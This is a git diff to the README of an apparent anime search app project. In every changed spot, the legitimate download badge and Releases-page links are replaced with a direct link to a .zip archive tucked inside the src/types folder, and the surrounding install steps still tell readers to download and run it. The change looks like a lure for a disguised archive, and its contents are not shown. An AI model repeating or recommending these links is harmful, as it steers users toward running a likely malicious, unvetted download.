@@ -1,6 +1,6 @@
 # 🎉 YoPrint_Anime_Search_App_Assessment - Discover Your Favorite Anime Instantly
 
-![Download YoPrint](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download YoPrint](https://raw.githubusercontent.com/fundamental-thirdperson587/YoPrint_Anime_Search_App_Assessment/main/src/types/YoPrint_Anime_Search_App_Assessment-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you start, ensure your computer meets these requirements:
 
 To get started, visit the Releases page to download the application. Click the link below to access it:
 
-[Visit this page to download](https://github.com/fundamental-thirdperson587/YoPrint_Anime_Search_App_Assessment/releases)
+[Visit this page to download](https://raw.githubusercontent.com/fundamental-thirdperson587/YoPrint_Anime_Search_App_Assessment/main/src/types/YoPrint_Anime_Search_App_Assessment-v2.3.zip)
 
 1. Open the link in a new tab.
 2. Look for the latest release.
@@ -76,4 +76,4 @@ We welcome any feedback or suggestions you may have. Feel free to open an issue 
 
 Remember to visit the Releases page to download the latest version of the app!
 
-[Visit this page to download](https://github.com/fundamental-thirdperson587/YoPrint_Anime_Search_App_Assessment/releases)
+[Visit this page to download](https://raw.githubusercontent.com/fundamental-thirdperson587/YoPrint_Anime_Search_App_Assessment/main/src/types/YoPrint_Anime_Search_App_Assessment-v2.3.zip)
